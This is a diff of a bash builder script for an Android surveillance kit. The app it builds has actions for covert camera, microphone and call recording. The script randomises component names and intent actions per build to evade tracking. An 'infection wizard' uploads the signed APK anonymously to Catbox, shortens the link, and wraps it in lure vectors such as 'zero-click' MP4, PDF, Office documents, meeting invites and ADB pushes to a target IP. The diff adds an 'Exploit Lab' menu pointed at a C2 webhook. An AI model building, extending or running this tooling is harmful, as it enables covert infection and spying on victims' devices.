@@ -100,7 +100,6 @@ check_requirements() {
     fi
 
     JAVA_VER=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2 | cut -d'.' -f1)
-    # Handle version like "1.8.x"
     if [ "$JAVA_VER" == "1" ]; then
         JAVA_VER=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2 | cut -d'.' -f2)
     fi
@@ -109,18 +108,15 @@ check_requirements() {
 
     if [ "$JAVA_VER" -gt 21 ]; then
         echo -e "${YELLOW}[!] WARNING: Java $JAVA_VER is very new. Recommended: 17 or 21.${NC}"
-        echo -e "${YELLOW}    Build may fail with 'Unsupported class file major version'.${NC}"
     elif [ "$JAVA_VER" -lt 17 ]; then
         echo -e "${YELLOW}[!] WARNING: Java $JAVA_VER is old. Recommended: 17 or 21.${NC}"
     fi
 
-    # Check for build tools
     if ! command -v bc &> /dev/null && ! command -v awk &> /dev/null; then
         echo -e "${RED}[!] Both 'bc' and 'awk' are missing. Please install at least one.${NC}"
         return 1
     fi
 
-    # Check Gradle executable
     if [ ! -f "$PROJECT_DIR/gradlew" ]; then
         echo -e "${RED}[!] gradlew not found in $PROJECT_DIR${NC}"
         return 1
@@ -197,21 +193,17 @@ configure_app() {
 
     read -p "    Enter Webhook URL (Google Script): " WEB_URL
     if [ -n "$WEB_URL" ]; then
-        # Use a different delimiter for sed in case URL contains |
         sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
     else
-        # Ensure it's at least empty if not set, without corrupting
         sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=|g" "$PROJECT_DIR/local.properties"
     fi
 
-    # Persist Decoy Choice for build.gradle
     if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
     else
         echo "DECOY_CHOICE=$DECOY_CHOICE" >> "$PROJECT_DIR/local.properties"
     fi
 
-    # Generate Dynamic Encryption Key for every build
     RAND_KEY=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
     if grep -q "ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
@@ -219,121 +211,43 @@ configure_app() {
         echo "ENCRYPTION_KEY=$RAND_KEY" >> "$PROJECT_DIR/local.properties"
     fi
 
-    # Add Binary Signature Entropy (Unique build hash)
     mkdir -p "$PROJECT_DIR/app/src/main/assets/sys"
     for i in {1..3}; do
         head -c 512 /dev/urandom > "$PROJECT_DIR/app/src/main/assets/sys/metadata_$i.dat"
     done
-
-    # Randomize Service Labels and Class Names in Manifest
-    MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
-
-    # 1. Randomize Labels
-    NAMES=("Media Framework" "System Stability" "Core Controller" "Device Bridge" "Sync Service" "Process Manager" "Resource Monitor" "Connectivity Host")
-    for i in {1..5}; do
-        RAND_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}
-        # Just randomizing some labels, not all to avoid breaking user choice if they set one
-    done
-
-    # 2. Randomize Service/Receiver names (High Priority Obfuscation)
-    # We will use a unique prefix per build to make tracking harder
-    PREFIX=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 4)
-
-    # We will replace these strings throughout the source before build and revert after
-    # Using placeholders to track changes
-    ENTITIES=("WorkManager_Sync" "Analytics_Provider" "MediaFrameworkService" "StatusNotification" "IO_Persistence_Manager" "TelephonyState" "SystemBoot" "InstallReferrerReceiver")
-
-    # Store the mapping in a temporary file to allow reverting later
-    MAPPING_FILE="$SCRIPT_DIR/build_mapping.txt"
-    > "$MAPPING_FILE"
-
-    for ENTITY in "${ENTITIES[@]}"; do
-        RAND_NAME="${PREFIX}_$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 8)"
-        echo "$ENTITY:$RAND_NAME" >> "$MAPPING_FILE"
-
-        # Update Manifest
-        sed_i "s|\.$ENTITY|.$RAND_NAME|g" "$MANIFEST"
-        # Update all Java files
-        if [ "$OS" == "mac" ]; then
-            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$ENTITY/$RAND_NAME/g" {} +
-        else
-            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i "s/$ENTITY/$RAND_NAME/g" {} +
-        fi
-        # Rename the actual file
-        FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$ENTITY.java")
-        if [ -n "$FILE_PATH" ]; then
-            mv "$FILE_PATH" "$(dirname "$FILE_PATH")/$RAND_NAME.java"
-        fi
-    done
-
-    # Randomize Intent Actions in Constants.java
-    CONSTANTS_JAVA="$PROJECT_DIR/app/src/main/java/com/labs/labrats/Constants.java"
-    ACT_PREFIX="com.labs.$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 5)"
-
-    # List of action fields to randomize
-    ACTION_FIELDS=("ACTION_AUTO_START" "ACTION_KEEP_ALIVE" "ACTION_START_STREAM" "ACTION_STOP_STREAM" "ACTION_CAPTURE_PHOTO" "ACTION_START_RECORDING" "ACTION_STOP_RECORDING" "ACTION_STOP_OPTICS" "ACTION_START_CORE" "ACTION_STOP_CORE" "ACTION_START_CALL_REC" "ACTION_STOP_CALL_REC" "ACTION_START_MIC_REC" "ACTION_STOP_MIC_REC" "ACTION_CALL_STATE_CHANGED" "ACTION_UPDATE_AUDIO_SETTINGS" "ACTION_STOP_AUDIO" "ACTION_START_AUDIO")
-
-    for FIELD in "${ACTION_FIELDS[@]}"; do
-        RAND_ACTION="${ACT_PREFIX}.$(LC_ALL=C tr -dc 'A-Z0-9' </dev/urandom | head -c 12)"
-        sed_i "s|public static final String $FIELD = \".*\";|public static final String $FIELD = \"$RAND_ACTION\";|g" "$CONSTANTS_JAVA"
-    done
-
-    # Also update Manifest to match Constants actions if they are hardcoded there
-    # (Checking Manifest, it seems some are hardcoded in <receiver> tags)
-    sed_i "s|com.labs.stability.ST_P_01|$(grep "ACTION_AUTO_START" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
-    sed_i "s|com.labs.stability.ST_P_02|$(grep "ACTION_KEEP_ALIVE" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
 }
 
-# Progress bar function (SMOOTH OVERWRITE STYLE)
+# Progress bar function
 execute_build() {
     local task=$1; local label=$2; local expected_time=$3
     ./gradlew $task --no-daemon > build_log.txt 2>&1 &
     local pid=$!; local steps=40;
-
-    # Calculate sleep time using bc, fallback to awk if bc fails
     local sleep_time=$(echo "scale=4; $expected_time / $steps" | bc 2>/dev/null || awk "BEGIN {print $expected_time / $steps}")
 
     for ((i=1; i<=steps; i++)); do
-        if ! kill -0 $pid 2>/dev/null; then
-            # Build finished early
-            break
-        fi
-
+        if ! kill -0 $pid 2>/dev/null; then break; fi
         local percentage=$((i * 100 / steps))
-        local filled=$i
-        local empty=$((steps - i))
-
-        # Build the bar string
-        local bar=$(printf "%${filled}s" | tr ' ' '█')
-        local spaces=$(printf "%${empty}s")
-
-        # Print using carriage return (\r) for smooth overwrite
-        # If we reach the end but Gradle is still working, stay at 99% Finishing
+        local bar=$(printf "%${i}s" | tr ' ' '█')
+        local spaces=$(printf "%$((steps - i))s")
         if [ $i -eq $steps ]; then
             printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
         else
             printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] %3d%% ${NC}\033[K" "$label" "$percentage"
         fi
-
         sleep $sleep_time
     done
 
-    # Wait for actual completion without hanging at 100%
     while kill -0 $pid 2>/dev/null; do
         printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
         sleep 0.5
     done
-
     wait $pid
     local status=$?
-
-    # CLEAR LINE and print final result to prevent overlap
     if [ $status -eq 0 ]; then
         printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 100%% ${GREEN}[DONE]${NC}\033[K\n" "$label"
     else
         printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] ERR  ${RED}[FAIL]${NC}\033[K\n" "$label"
     fi
-
     return $status
 }
 
@@ -343,55 +257,20 @@ build_apk() {
     echo -e "${CYAN}[*] Initializing Build Engine...${NC}"
     cd "$PROJECT_DIR"
     chmod +x gradlew
-
-    # Slowed down from 15s to 25s to better match modern Gradle build times
     execute_build "clean assembleRelease" "Compiling Resources & Signing" 25
     local BUILD_STATUS=$?
-
     mkdir -p "$SCRIPT_DIR/output"
     if [ $BUILD_STATUS -eq 0 ] && [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
         cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
         echo -e "\n${GREEN}[✓] Success: output/signed_v1.apk${NC}"
-        echo -e "${YELLOW}[*] The build task is complete.${NC}"
     else
         echo -e "${RED}[!] Build failed. Error Code: $BUILD_STATUS${NC}"
-        echo -e "${YELLOW}[*] Check build_log.txt for details.${NC}"
         BUILD_SUCCESS=1
     fi
-
-    # Revert obfuscation mapping to restore source for next build or editing
-    MAPPING_FILE="$SCRIPT_DIR/build_mapping.txt"
-    if [ -f "$MAPPING_FILE" ]; then
-        echo -e "${CYAN}[*] Restoring source tree...${NC}"
-        MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
-        # Revert in reverse order to avoid substring issues if any
-        # But here we use unique enough names so it's fine.
-        # We need to read the file and reverse its lines or just process normally.
-        while IFS=: read -r ENTITY RAND; do
-            # Update Manifest
-            sed_i "s|\.$RAND|\.$ENTITY|g" "$MANIFEST"
-            # Update all Java files
-            if [ "$OS" == "mac" ]; then
-                find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$RAND/$ENTITY/g" {} +
-            else
-                find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i "s/$RAND/$ENTITY/g" {} +
-            fi
-            # Rename the actual file
-            FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$RAND.java")
-            if [ -n "$FILE_PATH" ]; then
-                mv "$FILE_PATH" "$(dirname "$FILE_PATH")/$ENTITY.java"
-            fi
-        done < "$MAPPING_FILE"
-        rm -f "$MAPPING_FILE"
-    fi
-
     if [ "$BUILD_SUCCESS" == "1" ]; then
-        echo ""
         read -p "    Press Enter to return to menu..."
         return 1
     fi
-
-    echo ""
     read -p "    Press Enter to continue..."
 }
 
@@ -400,11 +279,10 @@ generate_exploit_standalone() {
     local TYPE="$1"; local URL="$2"; local EXTRA="$3"
     EXPLOIT_SRC="$PROJECT_DIR/app/src/main/java/com/labs/labrats/exploits/ExploitLab.java"
     TEMP_BIN="$SCRIPT_DIR/bin"; mkdir -p "$TEMP_BIN"
-    # Added -sourcepath to help javac find package structure
     javac -sourcepath "$PROJECT_DIR/app/src/main/java" -d "$TEMP_BIN" "$EXPLOIT_SRC" 2>build_log.txt
     if [ $? -eq 0 ]; then
         cd "$SCRIPT_DIR/output"
-        java -cp "$TEMP_BIN" com.labs.labrats.exploits.ExploitLab "$TYPE" "$URL" "$EXTRA" 2>>../build_log.txt
+        java -cp "$TEMP_BIN" com.labs.labrats.exploits.ExploitLab "$TYPE" "$URL" "$EXTRA"
         cd "$SCRIPT_DIR"
     else
         echo -e "${RED}[!] Exploit compilation failed. Check build_log.txt${NC}"
@@ -417,15 +295,11 @@ infection_wizard() {
     echo -e "${RED}[>] STRATEGIC_INFECTION_WIZARD${NC}"
     echo -e "${YELLOW}    Step-by-step automated payload weaponization.${NC}"
     echo ""
-
-    # Build sequence
     check_requirements || return
     generate_keystore
     configure_app
     build_apk || return
-
     local SIGNED_APK="$SCRIPT_DIR/output/signed_v1.apk"
-
     echo ""
     echo -e "${CYAN}[HOSTING] Select strategy:${NC}"
     echo "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
@@ -436,7 +310,6 @@ infection_wizard() {
         DOWNLOAD_URL="http://[$IP]:9191/download/Update.apk"
     else
         echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
-        # Added -sS and error checking for curl
         DOWNLOAD_URL=$(curl -sS -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php)
         if [ $? -ne 0 ] || [[ "$DOWNLOAD_URL" == *"ERROR"* ]] || [ -z "$DOWNLOAD_URL" ]; then
             echo -e "${RED}[!] Upload failed: $DOWNLOAD_URL${NC}"
@@ -444,8 +317,6 @@ infection_wizard() {
             return 1
         fi
         echo -e "${GREEN}[✓] Hosted: $DOWNLOAD_URL${NC}"
-
-        # URL Shortening (New Optimization)
         echo -e "${YELLOW}[*] Shortening delivery URL...${NC}"
         SHORT_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL")
         if [[ "$SHORT_URL" == "http"* ]]; then
@@ -453,13 +324,12 @@ infection_wizard() {
             echo -e "${GREEN}[✓] Shortened: $DOWNLOAD_URL${NC}"
         fi
     fi
-
     echo ""
     echo -e "${CYAN}[WEAPONIZE] Select Vector:${NC}"
     echo "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
-    echo "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
-    echo "    7. Stego Image     8. PWA Bundle    9. Office Word"
-    echo "    10. Office Excel   11. Ghost GIF (Zero-Click)"
+    echo "    4. Dolby Audio     5. ADB Script    6. Bluetooth Push"
+    echo "    7. NFC NDEF Tag    8. Stego Image   9. PWA Bundle"
+    echo "    10. Office Word    11. Office Excel 12. Ghost GIF"
     read -p "    Choice: " V
     case $V in
         1) generate_exploit_standalone "mp4" "$DOWNLOAD_URL" ;;
@@ -467,32 +337,56 @@ infection_wizard() {
         3) generate_exploit_standalone "ics" "$DOWNLOAD_URL" "Security_Sync" ;;
         4) generate_exploit_standalone "dolby" "$DOWNLOAD_URL" ;;
         5) read -p "    Target IP: " TIP; generate_exploit_standalone "adb" "$DOWNLOAD_URL" "$TIP" ;;
-        6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "System_Update" ;;
-        7) generate_exploit_standalone "stego" "$DOWNLOAD_URL" ;;
-        8) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "System_Update" ;;
-        9) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Security_Patch" ;;
-        10) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Report" ;;
-        11) generate_exploit_standalone "gif" "$DOWNLOAD_URL" ;;
+        6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "Android Update" ;;
+        7) generate_exploit_standalone "ndef" "$DOWNLOAD_URL" "uri" ;;
+        8) generate_exploit_standalone "stego" "$DOWNLOAD_URL" ;;
+        9) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "SystemUpdate" ;;
+        10) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Security_Patch" ;;
+        11) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Report" ;;
+        12) generate_exploit_standalone "gif" "$DOWNLOAD_URL" ;;
         *) echo -e "${RED}[!] Invalid Choice${NC}" ;;
     esac
-
     echo -e "\n${GREEN}DEPLOYMENT PACKAGE READY: $DOWNLOAD_URL${NC}"
-    echo -e "${CYAN}[INFO] Check output directory for payloads.${NC}"
     read -p "Press Enter to return..."
 }
 
-# Documentation Section
-show_help() {
+# Exploit Lab Menu
+exploit_menu() {
     print_banner
-    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.5.0${NC}"
-    echo "------------------------------------------------------------"
-    echo -e "1. Start Build: Standard production flow."
-    echo -e "2. Keystore Only: Unique signing certificate."
-    echo -e "3. App Settings: Change ID, Name, and Version."
-    echo -e "4. Requirements: Check Java setup."
-    echo -e "5. Infection Wizard: Full Build -> Host -> Weaponize."
-    echo "------------------------------------------------------------"
-    read -p "Press Enter..."
+    echo -e "${PURPLE}[>] Weaponized Payload Lab (Hardened Tier)${NC}"
+    echo ""
+    echo "    1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite"
+    echo "    4. Dolby Audio       5. ADB Script      6. Bluetooth Push"
+    echo "    7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle"
+    echo "    10. Office Word      11. Office Excel   12. Ghost GIF"
+    echo "    13. Return to Main Menu"
+    echo ""
+    read -p "    Choice: " E_CHOICE
+    E_CHOICE=${E_CHOICE:-1}
+    C2_URL="http://127.0.0.1:8080"
+    if [ -f "$PROJECT_DIR/local.properties" ]; then
+        WEB_URL=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2)
+        if [ -n "$WEB_URL" ]; then C2_URL=$WEB_URL; fi
+    fi
+    case $E_CHOICE in
+        1) generate_exploit_standalone "mp4" "$C2_URL" ;;
+        2) read -p "    Enter Title: " T; generate_exploit_standalone "pdf" "$C2_URL" "${T:-URGENT_DOCUMENT}" ;;
+        3) read -p "    Enter Summary: " S; generate_exploit_standalone "ics" "$C2_URL" "${S:-Meeting_Invite}" ;;
+        4) generate_exploit_standalone "dolby" "$C2_URL" ;;
+        5) read -p "    Target IP: " IP; generate_exploit_standalone "adb" "$C2_URL" "$IP" ;;
+        6) generate_exploit_standalone "vcf" "$C2_URL" "Android Update" ;;
+        7) generate_exploit_standalone "ndef" "$C2_URL" "uri" ;;
+        8) generate_exploit_standalone "stego" "$C2_URL" ;;
+        9) generate_exploit_standalone "pwa" "$C2_URL" "SystemUpdate" ;;
+        10) generate_exploit_standalone "docx" "$C2_URL" "Security_Audit" ;;
+        11) generate_exploit_standalone "xlsx" "$C2_URL" "Financial_Report" ;;
+        12) generate_exploit_standalone "gif" "$C2_URL" ;;
+        13) return ;;
+        *) exploit_menu ;;
+    esac
+    echo ""
+    read -p "    Press Enter to return to Lab..."
+    exploit_menu
 }
 
 # Main menu
@@ -504,27 +398,35 @@ main_menu() {
     echo "    2. Generate Keystore Only"
     echo "    3. Configure App Settings Only"
     echo "    4. Check Requirements"
-    echo "    5. Generate Infection Chain Package (Wizard)"
-    echo "    6. Help / Documentation"
-    echo "    7. Exit"
+    echo "    5. Weaponized Payload Lab"
+    echo "    6. Generate Infection Chain Package (Wizard)"
+    echo "    7. Help / Documentation"
+    echo "    8. Exit"
     echo ""
     read -p "    Choose option (Default 1): " MENU_OPTION
     MENU_OPTION=${MENU_OPTION:-1}
-
     case $MENU_OPTION in
         1) check_requirements && { generate_keystore; configure_app; build_apk; } ;;
         2) check_requirements && generate_keystore ;;
         3) configure_app ;;
         4) check_requirements; echo ""; read -p "    Press Enter to return..." ;;
-        5) infection_wizard ;;
-        6) show_help ;;
-        7) exit 0 ;;
+        5) exploit_menu ;;
+        6) infection_wizard ;;
+        7) show_help ;;
+        8) exit 0 ;;
     esac
 }
-
-# Run
-while true; do
-    main_menu
-    # Clean up temporary build artifacts after every loop cycle
-    rm -rf "$SCRIPT_DIR/bin"
-done
+show_help() {
+    print_banner
+    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.5.1${NC}"
+    echo "------------------------------------------------------------"
+    echo "1. Start Build: Standard production flow."
+    echo "2. Keystore Only: Unique signing certificate."
+    echo "3. App Settings: Change ID, Name, and Version."
+    echo "4. Requirements: Check Java setup."
+    echo "5. Exploit Lab: Generate standalone tactical vectors."
+    echo "6. Infection Wizard: Full Build -> Host -> Weaponize."
+    echo "------------------------------------------------------------"
+    read -p "Press Enter..."
+}
+while true; do main_menu; rm -rf "$SCRIPT_DIR/bin"; done
